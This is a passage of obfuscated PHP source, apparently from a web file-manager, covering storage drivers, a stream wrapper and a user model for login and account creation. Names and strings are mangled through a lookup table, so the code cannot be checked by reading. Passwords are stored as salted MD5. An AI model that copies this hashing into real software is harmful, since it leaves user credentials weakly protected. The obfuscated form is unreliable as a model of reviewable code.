$¼ßãèßş = 250) { $åŸÀìŸ = $this->link($´»ºâè . $_SERVER[…É¦À–][1524] . $¼ßãèßş); $this->fileOutLink($åŸÀìŸ); } public function fileOutImageServer($ÁŒ‰£­», $®©ƒäÍ‹ = 250) { parent::fileOutImage($ÁŒ‰£­», $®©ƒäÍ‹); } public function hashMd5($îó˜ïŠã) { $·‡¿¹™ô =& $_SERVER[…É¦À–]; $Äá¨µÜŸ = $this->_objectMeta($îó˜ïŠã); return isset($Äá¨µÜŸ[$·‡¿¹™ô[212]]) ? $Äá¨µÜŸ[$·‡¿¹™ô[212]] : !1; } public function size($ÌÚÍöé˜) { $‡ÍÀÎ×‹ = $this->objectMeta($ÌÚÍöé˜); return $‡ÍÀÎ×‹ ? $‡ÍÀÎ×‹[$_SERVER[…É¦À–][76]] : 0; } public function info($éÜŒéÛÅ) { if ($this->isFolder($éÜŒéÛÅ)) { return $this->folderInfo($éÜŒéÛÅ); } else { if ($this->isFile($éÜŒéÛÅ)) { return $this->fileInfo($éÜŒéÛÅ); } } return !1; } public function exist($Ü‰¯¼ş®) { return $this->isFile($Ü‰¯¼ş®) || $this->isFolder($Ü‰¯¼ş®); } public function isFile($¯”ÃİıÄ) { return !$this->isFolder($¯”ÃİıÄ) && $this->objectMeta($¯”ÃİıÄ); } public function isFolder($¸ÑìÚŠ) { return $this->cacheMethod($_SERVER[…É¦À–][165], $¸ÑìÚŠ); } protected function objectMeta($şÆ±¡´Ñ) { return $this->cacheMethod($_SERVER[…É¦À–][167], $şÆ±¡´Ñ); } protected function _objectMeta($Ù‹) { $ş™Ö­Â =& $_SERVER[…É¦À–]; if ($Ù‹ == $ş™Ö­Â[12] || $Ù‹ == $ş™Ö­Â[8]) { return array(); } $üíò©¿ƒ = $this->ussRequest($Ù‹, $ş™Ö­Â[1525]); if (!$üíò©¿ƒ[$ş™Ö­Â[1257]]) { return null; } $ŞåÜ‘¬Ø = isset($üíò©¿ƒ[$ş™Ö­Â[1247]]) ? $üíò©¿ƒ[$ş™Ö­Â[1247]] : array(); if (!isset($ŞåÜ‘¬Ø[$ş™Ö­Â[1526]])) { return null; } $ì‹¥åşÏ = array($ş™Ö­Â[33] => isset($ŞåÜ‘¬Ø[$ş™Ö­Â[1526]]) ? $ŞåÜ‘¬Ø[$ş™Ö­Â[1526]] : null, $ş™Ö­Â[76] => isset($ŞåÜ‘¬Ø[$ş™Ö­Â[1527]]) ? $ŞåÜ‘¬Ø[$ş™Ö­Â[1527]] : null, $ş™Ö­Â[212] => isset($ŞåÜ‘¬Ø[$ş™Ö­Â[1528]]) ? $ŞåÜ‘¬Ø[$ş™Ö­Â[1528]] : null, $ş™Ö­Â[1495] => isset($ŞåÜ‘¬Ø[$ş™Ö­Â[1529]]) ? $ŞåÜ‘¬Ø[$ş™Ö­Â[1529]] : null); $ì‹¥åşÏ[$ş™Ö­Â[1496]] = isset($ŞåÜ‘¬Ø[$ş™Ö­Â[1530]]) ? strtotime($ŞåÜ‘¬Ø[$ş™Ö­Â[1530]]) : $ì‹¥åşÏ[$ş™Ö­Â[1495]]; return $ì‹¥åşÏ; } protected function _isFolder($ô·ä·ûì) { $ü¡¶éã =& $_SERVER[…É¦À–]; if ($ô·ä·ûì == $ü¡¶éã[12] || $ô·ä·ûì == $ü¡¶éã[8]) { return !0; } $¶Š÷…İ© = $this->_objectMeta($ô·ä·ûì); return isset($¶Š÷…İ©[$ü¡¶éã[33]]) && $¶Š÷…İ©[$ü¡¶éã[33]] == $ü¡¶éã[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($€£€™Íí = false) { } public function exist($¦õ¼Ñ¼) { $„±‡„°ª = $this->info($¦õ¼Ñ¼); return $„±‡„°ª[$_SERVER[…É¦À–][202]]; } public function isFile($²ºĞ—ü‡) { $Şëò–Í½ = $this->info($²ºĞ—ü‡); return $Şëò–Í½[$_SERVER[…É¦À–][202]]; } public function isFolder($œüƒÁ·) { return !1; } public function size($«Ìæîº ) { $ÂË°Âë¢ = $this->info($«Ìæîº ); return $ÂË°Âë¢[$_SERVER[…É¦À–][76]]; } public function info($ìñş¸İ) { return $this->infoParse($ìñş¸İ); } public function infoAuth($¸£°»š) { return $this->infoParse($¸£°»š); } public function infoWithChildren($•‰öÖË˜) { return $this->infoParse($•‰öÖË˜); } public function infoFull($‚Ãó…°) { return $this->infoParse($‚Ãó…°); } private function infoParse($Ğˆòêéº) { $ëæÍĞó§ =& $_SERVER[…É¦À–]; $¾·ä¢ñÄ = $this->header($Ğˆòêéº); if (!$¾·ä¢ñÄ || !$¾·ä¢ñÄ[$ëæÍĞó§[790]]) { return !1; } $£íéââ“ = _get($¾·ä¢ñÄ, $ëæÍĞó§[366], 0); $éù˜÷ú = array($ëæÍĞó§[32] => $¾·ä¢ñÄ[$ëæÍĞó§[32]], $ëæÍĞó§[84] => $Ğˆòêéº, $ëæÍĞó§[33] => $ëæÍĞó§[200], $ëæÍĞó§[76] => intval($£íéââ“), $ëæÍĞó§[174] => get_path_ext($¾·ä¢ñÄ[$ëæÍĞó§[32]]), $ëæÍĞó§[1409] => $£íéââ“ > 0 && $¾·ä¢ñÄ[$ëæÍĞó§[1531]], $ëæÍĞó§[1410] => !1); return $éù˜÷ú; } private function header($¢¹á§®Ï) { $ĞÙØ©Å =& $_SERVER[…É¦À–]; if (isset(self::$_cacheHeader[$¢¹á§®Ï])) { return self::$_cacheHeader[$¢¹á§®Ï]; } $´¢§Ë = isset($GLOBALS[$ĞÙØ©Å[1532]]) ? $GLOBALS[$ĞÙØ©Å[1532]] : !1; $GLOBALS[$ĞÙØ©Å[1532]] = !0; self::$_cacheHeader[$¢¹á§®Ï] = url_header($¢¹á§®Ï); $GLOBALS[$ĞÙØ©Å[1532]] = $´¢§Ë; return self::$_cacheHeader[$¢¹á§®Ï]; } public function hashSimple($‘Íçñ¼¬, $ƒŒ–õƒ¤ = false) { $¿Æ»çåâ =& $_SERVER[…É¦À–]; $ïŠÎàüè = $this->info($‘Íçñ¼¬); if (!$ïŠÎàüè || !$ïŠÎàüè[$¿Æ»çåâ[202]]) { return !1; } $ÇĞèÍ³Ÿ = $ïŠÎàüè[$¿Æ»çåâ[76]]; $‘ÔùúÕ¥ = 200; $ÖµğØ¸‚ = 50; if ($ÇĞèÍ³Ÿ <= $‘ÔùúÕ¥ * $ÖµğØ¸‚) { return md5($this->fileSubstr($‘Íçñ¼¬, 0, $ÇĞèÍ³Ÿ)) . $ÇĞèÍ³Ÿ; } $Ä®¤æ§× = intval($ÇĞèÍ³Ÿ / $ÖµğØ¸‚); $ğ¢¼½€ = $¿Æ»çåâ[12]; $Ößçöè‡ = timeFloat(); $«˜ÙÍ¦× = 15; for ($ÆŒ×”¸ú = 0; $ÆŒ×”¸ú < $ÖµğØ¸‚; $ÆŒ×”¸ú++) { if (timeFloat() - $Ößçöè‡ > $«˜ÙÍ¦×) { return !1; } $ËÓˆÀø = $this->fileSubstr($‘Íçñ¼¬, $Ä®¤æ§× * $ÆŒ×”¸ú, $‘ÔùúÕ¥); if (!$ËÓˆÀø) { return !1; } $ğ¢¼½€ .= $ËÓˆÀø; } $ğ¢¼½€ .= $this->fileSubstr($‘Íçñ¼¬, $ÇĞèÍ³Ÿ - $‘ÔùúÕ¥, $‘ÔùúÕ¥); return md5($ğ¢¼½€) . $ÇĞèÍ³Ÿ; } public function getContent($°ËÅÙÌÆ) { return $this->fileSubstr($°ËÅÙÌÆ); } public function fileSubstr($ƒ€ƒÈ¬¤, $Ò€î×• = 0, $Í˜óÛÇç = -1) { $Ÿ§ç¹¦ =& $_SERVER[…É¦À–]; $çùşğ § = $this->info($ƒ€ƒÈ¬¤); if (!$çùşğ § || !$çùşğ §[$Ÿ§ç¹¦[202]] && $çùşğ §[$Ÿ§ç¹¦[76]] > 1024 * 1024 * 10) { return !1; } if ($Í˜óÛÇç === -1) { $Í˜óÛÇç = $çùşğ §[$Ÿ§ç¹¦[76]]; } if ($Í˜óÛÇç == 0) { return $Ÿ§ç¹¦[12]; } $Úê—¦­¤ = array($Ÿ§ç¹¦[1533] . $Ò€î×• . $Ÿ§ç¹¦[822] . ($Ò€î×• + $Í˜óÛÇç - 1)); $ñË½Ò–ù = url_request($ƒ€ƒÈ¬¤, $Ÿ§ç¹¦[230], !1, $Úê—¦­¤, !1, !1, 30); return $ñË½Ò–ù[$Ÿ§ç¹¦[1247]] ? $ñË½Ò–ù[$Ÿ§ç¹¦[1247]] : $Ÿ§ç¹¦[12]; } public function download($Ä–Î¡ç«, $â’€‡œõ) { Downloader::start($Ä–Î¡ç«, $â’€‡œõ); return $â’€‡œõ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ŞÆŒÅÎ, $çàŒ¡„ = '') { $this->info = $this->info($ŞÆŒÅÎ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[…É¦À–][84]]; $this->pathOpen = $ŞÆŒÅÎ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ŞÆŒÅÎ])) { self::$_chunkBuffer[$ŞÆŒÅÎ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Õ£ò‚çŒ) { $¥€£õ¾Í = $this->fileSubstr($this->pose, $Õ£ò‚çŒ); $this->pose += strlen($¥€£õ¾Í); return $¥€£õ¾Í; } public function stream_tell() { return $this->pose; } public function stream_seek($¶¾˜÷Ô´, $ÔäÃ¶İ€) { $¥á¥·–î =& $_SERVER[…É¦À–]; if ($ÔäÃ¶İ€ == SEEK_SET) { $this->pose = $¶¾˜÷Ô´; } else { if ($ÔäÃ¶İ€ == SEEK_CUR) { $this->pose += $¶¾˜÷Ô´; } else { if ($ÔäÃ¶İ€ == SEEK_END) { $this->pose = $this->info[$¥á¥·–î[76]] + intval($¶¾˜÷Ô´); } } } if ($¶¾˜÷Ô´ < 0) { $this->pose = $this->info[$¥á¥·–î[76]] + $¶¾˜÷Ô´; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[…É¦À–][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($áïĞ»Æ¬, $û•  µ) { $¸‘³÷±â =& $_SERVER[…É¦À–]; $®ìª´¥ = $this->info($áïĞ»Æ¬); return array($¸‘³÷±â[1534] => 0, $¸‘³÷±â[1535] => 0, $¸‘³÷±â[16] => 32768 + 511, $¸‘³÷±â[1536] => 0, $¸‘³÷±â[1537] => 0, $¸‘³÷±â[1538] => 0, $¸‘³÷±â[1539] => 0, $¸‘³÷±â[76] => $®ìª´¥[$¸‘³÷±â[76]], $¸‘³÷±â[1540] => $®ìª´¥[$¸‘³÷±â[1408]], $¸‘³÷±â[1496] => $®ìª´¥[$¸‘³÷±â[85]], $¸‘³÷±â[1495] => $®ìª´¥[$¸‘³÷±â[201]], $¸‘³÷±â[1541] => 0, $¸‘³÷±â[1542] => 0); } static $fileInfo = array(); public function info($Ò¹ıßïş) { $Ì‘É™˜À = $_SERVER[…É¦À–][1543]; if (isset(self::$fileInfo[$Ò¹ıßïş])) { return self::$fileInfo[$Ò¹ıßïş]; } if (substr($Ò¹ıßïş, 0, strlen($Ì‘É™˜À)) != $Ì‘É™˜À) { return !1; } self::$fileInfo[$Ò¹ıßïş] = IO::info(substr($Ò¹ıßïş, strlen($Ì‘É™˜À))); return self::$fileInfo[$Ò¹ıßïş]; } public static function read($ßÆ¥ ˆ, $Õ¹´Äúˆ, $–âë¤¶) { if (!isset(self::$_fopenCache[$ßÆ¥ ˆ])) { $Ç–¦ÉŸ¤ = new StreamWrapperIO(); $Ç–¦ÉŸ¤->stream_open($ßÆ¥ ˆ); self::$_fopenCache[$ßÆ¥ ˆ] = $Ç–¦ÉŸ¤; } $Ç–¦ÉŸ¤ = self::$_fopenCache[$ßÆ¥ ˆ]; return $Ç–¦ÉŸ¤->fileSubstr($Õ¹´Äúˆ, $–âë¤¶); } public static function _read($¨’ŠÇ¥ò, $ƒãúëæ¾, $•™æÂ) { $ àü¬Œ® =& $_SERVER[…É¦À–]; $ÕÈ†¸Ÿ = fopen($¨’ŠÇ¥ò, $ àü¬Œ®[1412]); if (!$ÕÈ†¸Ÿ) { return $ àü¬Œ®[12]; } $€‹ÖÂµÉ = 8192; fseek($ÕÈ†¸Ÿ, $ƒãúëæ¾, SEEK_SET); $¦›–ë¢Ô = $ àü¬Œ®[12]; $ğıĞÄ…º = 0; while ($ğıĞÄ…º < $•™æÂ) { $‡„óÏ±è = min($€‹ÖÂµÉ, $•™æÂ - $ğıĞÄ…º); $¦›–ë¢Ô .= fread($ÕÈ†¸Ÿ, $‡„óÏ±è); $ğıĞÄ…º += $‡„óÏ±è; } fclose($ÕÈ†¸Ÿ); return $¦›–ë¢Ô; } public function fileSubstr($ì±Ø—Ôñ, $ÁÆ¹ÓÁÒ) { $Ëç´³ œ =& $_SERVER[…É¦À–]; $±ĞÒØÊ‹ = $this->info[$Ëç´³ œ[76]]; $ÀË¸È¾ = $ì±Ø—Ôñ; $ü»çú = $ÁÆ¹ÓÁÒ; if ($ì±Ø—Ôñ < 0) { $ì±Ø—Ôñ = $±ĞÒØÊ‹ + $ì±Ø—Ôñ; } if ($ÁÆ¹ÓÁÒ === !1) { $ÁÆ¹ÓÁÒ = $±ĞÒØÊ‹ - $ì±Ø—Ôñ; } if ($ì±Ø—Ôñ + $ÁÆ¹ÓÁÒ > $±ĞÒØÊ‹) { $ÁÆ¹ÓÁÒ = $±ĞÒØÊ‹ - $ì±Ø—Ôñ; } if ($ÁÆ¹ÓÁÒ <= 0) { return $Ëç´³ œ[12]; } if ($ì±Ø—Ôñ < 0 || $ì±Ø—Ôñ >= $±ĞÒØÊ‹ || $ÁÆ¹ÓÁÒ <= 0 || $ÁÆ¹ÓÁÒ > 1024 * 1024 * 10) { throw new Exception("\x69\157\106\x69\x6c\145\x52\145\141\144\x20\145\x72\x72\x6f\162\x21\40\x73\x74\141\162\164\x3d{$ì±Ø—Ôñ}\73\x6c\x65\156\147\x74\150\75{$ÁÆ¹ÓÁÒ}\x3b\40\163\x69\x7a\x65\75{$±ĞÒØÊ‹}\73"); } $™Ú²ÃÙ = 64 * 1024; $õ¤é…°Õ =& self::$_chunkBuffer[$this->path]; if (!$õ¤é…°Õ) { $õ¤é…°Õ = array(); } $¶ÊàÊ = 0; $Ø¸å´÷ã = 0; $©ÌúÖÉ÷ = $Ëç´³ œ[12]; foreach ($õ¤é…°Õ as $¶ÊàÊ => $©ÌúÖÉ÷) { $¶ÊàÊ = intval($¶ÊàÊ); $Ø¸å´÷ã = $¶ÊàÊ + strlen($©ÌúÖÉ÷); if ($ì±Ø—Ôñ >= $Ø¸å´÷ã) { continue; } if ($ì±Ø—Ôñ >= $¶ÊàÊ && $ì±Ø—Ôñ + $ÁÆ¹ÓÁÒ <= $Ø¸å´÷ã) { return substr($©ÌúÖÉ÷, $ì±Ø—Ôñ - $¶ÊàÊ, $ÁÆ¹ÓÁÒ); } break; } if (count($õ¤é…°Õ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ëç´³ œ[1544], $Ëç´³ œ[1545] . count($õ¤é…°Õ) . "\73\x73\x74\141\x72\164\x3d{$ì±Ø—Ôñ}\54\154\145\156\x67\x74\x68\x3d{$ÁÆ¹ÓÁÒ}\73\160\x6f\163\145\72{$¶ÊàÊ}\x7e{$Ø¸å´÷ã}"); throw new Exception($Ëç´³ œ[1546]); } $½äÂ¥‘š = intval($ì±Ø—Ôñ / $™Ú²ÃÙ) * $™Ú²ÃÙ; $«ş®æÃ¶ = ceil(($ì±Ø—Ôñ + $ÁÆ¹ÓÁÒ) / $™Ú²ÃÙ) * $™Ú²ÃÙ - $½äÂ¥‘š; $İÑµåÂ“ = IO::fileSubstr($this->path, $½äÂ¥‘š, $«ş®æÃ¶); $õ¤é…°Õ[$½äÂ¥‘š . $Ëç´³ œ[12]] = $İÑµåÂ“; ksort($õ¤é…°Õ); $İ—™’âò = substr($İÑµåÂ“, $ì±Ø—Ôñ - $½äÂ¥‘š, $ÁÆ¹ÓÁÒ); return $İ—™’âò; } private function log($ÔŠ’×¦Š, $Ñë•÷é£) { $¹ÄÓÉÎÁ =& $_SERVER[…É¦À–]; $ıä—ÑÏ = timeFloat() - $this->timeStart; write_log(sprintf($¹ÄÓÉÎÁ[1547], $ÔŠ’×¦Š, $this->info[$¹ÄÓÉÎÁ[32]], $ıä—ÑÏ, $Ñë•÷é£), $¹ÄÓÉÎÁ[1227]); } } goto Cˆ”ãóùŒ¡; a‡„ŒÌ’»: class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\141\x6d\x65" => "\x75\x73\x65\x72\137\x6d\145\164\x61", "\x6d\x65\164\x61\x46\x69\145\x6c\144" => "\165\x73\145\x72\x49\104"); protected $simpleField = "\165\163\145\162\111\x44\54\x6e\151\x63\x6b\116\141\x6d\145\54\x6e\141\x6d\x65\x2c\x61\x76\x61\164\x61\x72\x2c\x73\145\170\54\163\x74\x61\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($€û†‰¸) { $«ØãàÒ— =& $_SERVER[…É¦À–]; $‡Ôú†•Ù = $«ØãàÒ—[2325]; return array($«ØãàÒ—[1955] => array($€û†‰¸[0], $‡Ôú†•Ù), $«ØãàÒ—[1957] => array($€û†‰¸[0], $‡Ôú†•Ù), $«ØãàÒ—[2326] => array($€û†‰¸[0], $‡Ôú†•Ù)); } protected function getInfo($áü™Ëº¿, $«’´ïô = false) { $¤¯ĞÚ‘ú = $this->getInfoSimple($áü™Ëº¿); if (!is_array($¤¯ĞÚ‘ú)) { return array(); } if ($«’´ïô) { return $this->_getInfoApply($¤¯ĞÚ‘ú); } return $this->cacheFunctionGet($_SERVER[…É¦À–][1959], $áü™Ëº¿); } protected function getInfoFull($ËµşÈµ½, $÷ğŸİšÈ = false) { $°„îÆâô = $this->getInfoSimple($ËµşÈµ½); if (!is_array($°„îÆâô)) { return array(); } if ($÷ğŸİšÈ) { return $this->_getInfoApply($°„îÆâô, !0); } return $this->cacheFunctionGet($_SERVER[…É¦À–][2327], $ËµşÈµ½); } private function _getInfoApply($‹÷®ºÄµ, $ä«–÷ßË = false) { $Şªºû¤À =& $_SERVER[…É¦À–]; if (!$‹÷®ºÄµ) { return $‹÷®ºÄµ; } $«Š½ÇÙ = md5($Şªºû¤À[2328] . $‹÷®ºÄµ[$Şªºû¤À[934]] . $Şªºû¤À[2329] . $‹÷®ºÄµ[$Şªºû¤À[32]]); $‹÷®ºÄµ = $this->_listDataApplyItem($‹÷®ºÄµ); $ÂÇĞÑ ü = Model($Şªºû¤À[1378])->metaGet($‹÷®ºÄµ[$Şªºû¤À[87]][$Şªºû¤À[431]]); $‹÷®ºÄµ[$Şªºû¤À[2330]] = $«Š½ÇÙ; $‹÷®ºÄµ[$Şªºû¤À[87]][$Şªºû¤À[2151]] = isset($ÂÇĞÑ ü[$Şªºû¤À[2152]]) ? $ÂÇĞÑ ü[$Şªºû¤À[2152]] : null; if ($ä«–÷ßË) { $‹÷®ºÄµ[$Şªºû¤À[495]] = $this->metaGet($‹÷®ºÄµ[$Şªºû¤À[1687]]); } return $‹÷®ºÄµ; } protected function getInfoSimple($¹Û°ª¡½, $ô¾ø¹¦½ = false) { $¤µóÈ© =& $_SERVER[…É¦À–]; if (!$¹Û°ª¡½) { return array(); } if ($ô¾ø¹¦½) { $µ›•Í»‚ = $this->where(array($¤µóÈ©[1687] => intval($¹Û°ª¡½)))->find(); if (!is_array($µ›•Í»‚)) { return array(); } $µ›•Í»‚[$¤µóÈ©[562]] = Action($¤µóÈ©[2331])->parseUrl($µ›•Í»‚[$¤µóÈ©[562]]); return $µ›•Í»‚; } return $this->cacheFunctionGet($¤µóÈ©[1960], $¹Û°ª¡½); } protected function getInfoSimpleOuter($²Ì¢¡) { $¾°§Úş„ =& $_SERVER[…É¦À–]; if (!$²Ì¢¡ || $²Ì¢¡ == 0) { return array($¾°§Úş„[1687] => $¾°§Úş„[198], $¾°§Úş„[32] => $¾°§Úş„[162] . LNG($¾°§Úş„[2332]) . $¾°§Úş„[164], $¾°§Úş„[562] => STATIC_PATH . $¾°§Úş„[2333]); } $åüË¹Æ¨ = $this->cacheFunctionGet($¾°§Úş„[1960], $²Ì¢¡); $Ï”Ü›¦† = array_field_key($åüË¹Æ¨, explode($¾°§Úş„[50], $this->simpleField)); if (!$Ï”Ü›¦†) { return array($¾°§Úş„[1687] => $¾°§Úş„[1233], $¾°§Úş„[32] => $¾°§Úş„[162] . LNG($¾°§Úş„[2334]) . $¾°§Úş„[164], $¾°§Úş„[562] => STATIC_PATH . $¾°§Úş„[2335]); } $Ï”Ü›¦†[$¾°§Úş„[562]] = Action($¾°§Úş„[2331])->parseUrl($Ï”Ü›¦†[$¾°§Úş„[562]]); return $Ï”Ü›¦†; } protected function groupUser($å‘«¬½ö) { } public static function errorLang($¨ï­àóä) { $áÎøîóº =& $_SERVER[…É¦À–]; $ˆ¢ş™Üä = array(self::ERROR_USER_NOT_EXISTS => $áÎøîóº[2336], self::ERROR_USER_PASSWORD_ERROR => $áÎøîóº[2337], self::ERROR_USER_EXIST_NAME => $áÎøîóº[2338], self::ERROR_USER_EXIST_PHONE => $áÎøîóº[2339], self::ERROR_USER_EXIST_EMAIL => $áÎøîóº[2340], self::ERROR_USER_LOGIN_LOCK => $áÎøîóº[2341], self::ERROR_IP_NOT_ALLOW => $áÎøîóº[2342], self::ERROR_USER_EXIST_NICKNAME => $áÎøîóº[2343]); return LNG($ˆ¢ş™Üä[$¨ï­àóä]); } public function getInfoByMeta($âš»Æ½×, $ü€‰‘¿Ò) { $Ôêçõ‘ş =& $_SERVER[…É¦À–]; $£ìå¸Æ‹ = Model($Ôêçõ‘ş[2344])->where(array($Ôêçõ‘ş[94] => $âš»Æ½×, $Ôêçõ‘ş[403] => $ü€‰‘¿Ò))->find(); if ($£ìå¸Æ‹) { return $this->getInfo($£ìå¸Æ‹[$Ôêçõ‘ş[1687]]); } return !1; } public function userLoginCheck($ŸüÙÅã, $ßëı¹Ñ) { $“†âèÑ =& $_SERVER[…É¦À–]; $Ú¶Îƒ³À = $this->userLoginFind($ŸüÙÅã); if (!$Ú¶Îƒ³À) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($Ú¶Îƒ³À[$“†âèÑ[1687]], $ßëı¹Ñ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($Ú¶Îƒ³À[$“†âèÑ[1687]]); } public function userLoginFind($í‚—¸˜ã) { $åÜê”±˜ =& $_SERVER[…É¦À–]; $¾°Ãİ²Î = array($åÜê”±˜[32] => $í‚—¸˜ã, $åÜê”±˜[561] => $í‚—¸˜ã, $åÜê”±˜[334] => $í‚—¸˜ã, $åÜê”±˜[2345] => $í‚—¸˜ã, $åÜê”±˜[1045] => $åÜê”±˜[1047]); if ($this->nickNameRpt()) { unset($¾°Ãİ²Î[$åÜê”±˜[561]]); } return $this->where($¾°Ãİ²Î)->find(); } public function clearCache($†øÖÏ‚®) { $İ•£™Àş =& $_SERVER[…É¦À–]; $this->cacheFunctionClear($İ•£™Àş[1959], $†øÖÏ‚®); $this->cacheFunctionClear($İ•£™Àş[1960], $†øÖÏ‚®); $this->cacheFunctionClear($İ•£™Àş[2327], $†øÖÏ‚®); } public function userPasswordCheck($òñµ¯âã, $ÆïˆÆÍ†) { $ñÂÈ–ş„ =& $_SERVER[…É¦À–]; $§‚ òĞÛ = $this->where(array($ñÂÈ–ş„[1687] => intval($òñµ¯âã)))->find(); $š×ùšò = $this->metaGet($òñµ¯âã); $…—Ÿô±‘ = isset($š×ùšò[$ñÂÈ–ş„[2346]]) ? $š×ùšò[$ñÂÈ–ş„[2346]] : $ñÂÈ–ş„[12]; if (md5($…—Ÿô±‘ . trim($ÆïˆÆÍ†)) !== $§‚ òĞÛ[$ñÂÈ–ş„[934]]) { return !1; } return !0; } public function userAdd($†°êÕÅ) { $¢Ğß×ìø =& $_SERVER[…É¦À–]; $Û¾‡¸„õ = array($¢Ğß×ìø[449] => $†°êÕÅ[$¢Ğß×ìø[32]], $¢Ğß×ìø[2347] => $†°êÕÅ[$¢Ğß×ìø[1565]], $¢Ğß×ìø[2348] => isset($†°êÕÅ[$¢Ğß×ìø[334]]) ? $†°êÕÅ[$¢Ğß×ìø[334]] : $¢Ğß×ìø[12], $¢Ğß×ìø[2349] => isset($†°êÕÅ[$¢Ğß×ìø[2345]]) ? $†°êÕÅ[$¢Ğß×ìø[2345]] : $¢Ğß×ìø[12], $¢Ğß×ìø[2350] => isset($†°êÕÅ[$¢Ğß×ìø[561]]) ? $†°êÕÅ[$¢Ğß×ìø[561]] : $†°êÕÅ[$¢Ğß×ìø[32]], $¢Ğß×ìø[2351] => isset($†°êÕÅ[$¢Ğß×ìø[562]]) ? $†°êÕÅ[$¢Ğß×ìø[562]] : $¢Ğß×ìø[12], $¢Ğß×ìø[2352] => isset($†°êÕÅ[$¢Ğß×ìø[2353]]) ? $†°êÕÅ[$¢Ğß×ìø[2353]] : 1, $¢Ğß×ìø[2354] => $†°êÕÅ[$¢Ğß×ìø[934]], $¢Ğß×ìø[1961] => isset($†°êÕÅ[$¢Ğß×ìø[1864]]) ? $†°êÕÅ[$¢Ğß×ìø[1864]] : 1024 * 1024 * 20, $¢Ğß×ìø[1962] => 0, $¢Ğß×ìø[2355] => 0, $¢Ğß×ìø[2006] => isset($†°êÕÅ[$¢Ğß×ìø[790]]) ? $†°êÕÅ[$¢Ğß×ìø[790]] : 1); if (!empty($†°êÕÅ[$¢Ğß×ìø[1687]])) { $Û¾‡¸„õ[$¢Ğß×ìø[1687]] = $†°êÕÅ[$¢Ğß×ìø[1687]]; } $Ãç®¿ = $this->_checkExist($†°êÕÅ); if ($Ãç®¿ !== !0) { return $Ãç®¿; } if (!empty($Û¾‡¸„õ[$¢Ğß×ìø[562]]) && strlen($Û¾‡¸„õ[$¢Ğß×ìø[562]]) > 255) { $Û¾‡¸„õ[$¢Ğß×ìø[562]] = $¢Ğß×ìø[12]; } $Ô»·Æé‡ = $this->add($Û¾‡¸„õ); $•Ç–æß = array($¢Ğß×ìø[2354] => $Û¾‡¸„õ[$¢Ğß×ìø[934]], $¢Ğß×ìø[2350] => $Û¾‡¸„õ[$¢Ğß×ìø[561]]); $this->userEdit($Ô»·Æé‡, $•Ç–æß); Model($¢Ğß×ìø[1378])->userRootAdd($Ô»·Æé‡); return $Ô»·Æé‡; } protected function userEditTest($Ä¥´º¬è, $£ÇĞº¦) { return $this->call($_SERVER[…É¦À–][2356], $Ä¥´º¬è, $£ÇĞº¦); } protected function userEdit($İ±éİó¬, $¸¸‚¬¬°) { $òú€’‚È =& $_SERVER[…É¦À–]; $›ôª«şÎ = $this->getInfoSimple($İ±éİó¬); if (!$›ôª«şÎ) { return !1; } $ÖˆÔé·õ = $this->_checkExist($¸¸‚¬¬°, $İ±éİó¬); if ($ÖˆÔé·õ !== !0) { return $ÖˆÔé·õ; } if (isset($¸¸‚¬¬°[$òú€’‚È[934]]) && trim($¸¸‚¬¬°[$òú€’‚È[934]]) != $òú€’‚È[12]) { $õµÂ¸™‡ = $this->metaGet($İ±éİó¬); if (empty($õµÂ¸™‡[$òú€’‚È[2346]])) { $õµÂ¸™‡[$òú€’‚È[2346]] = rand_string(10); Model($òú€’‚È[533])->metaSet($İ±éİó¬, $òú€’‚È[2346], $õµÂ¸™‡[$òú€’‚È[2346]]); } $¸¸‚¬¬°[$òú€’‚È[934]] = md5($õµÂ¸™‡[$òú€’‚È[2346]] . trim($¸¸‚¬¬°[$òú€’‚È[934]])); } else { unset($¸¸‚¬¬°[$òú€’‚È[934]]); } if (!empty($¸¸‚¬¬°[$òú€’‚È[562]]) && strlen($¸¸‚¬¬°[$òú€’‚È[562]]) > 255) { $¸¸‚¬¬°[$òú€’‚È[562]] = $òú€’‚È[12]; } $this->where(array($òú€’‚È[1678] => $İ±éİó¬))->save($¸¸‚¬¬°); if (isset($¸¸‚¬¬°[$òú€’‚È[561]])) { $this->setNamePinyin($İ±éİó¬, $¸¸‚¬¬°[$òú€’‚È[561]]); } $this->clearCache($İ±éİó¬); return !0; } public function setNamePinyin($äöÌÇˆ, $õÕ•ş›Ì = false) { $ÑìØÃùä =& $_SERVER[…É¦À–]; if (!$õÕ•ş›Ì) { $¡“Øîı“ = $this->getInfoSimple($äöÌÇˆ); $õÕ•ş›Ì = $¡“Øîı“[$ÑìØÃùä[561]] ? $¡“Øîı“[$ÑìØÃùä[561]] : $¡“Øîı“[$ÑìØÃùä[32]]; } $«ş¤É = Model($ÑìØÃùä[554]); if (!Input::check($õÕ•ş›Ì, $ÑìØÃùä[612])) { return $«ş¤É->metaSet($äöÌÇˆ, array($ÑìØÃùä[494] => $ÑìØÃùä[12], $ÑìØÃùä[493] => $ÑìØÃùä[12])); } return $«ş¤É->metaSet($äöÌÇˆ, array($ÑìØÃùä[494] => str_replace($ÑìØÃùä[53], $ÑìØÃùä[12], Pinyin::get($õÕ•ş›Ì)), $ÑìØÃùä[493] => 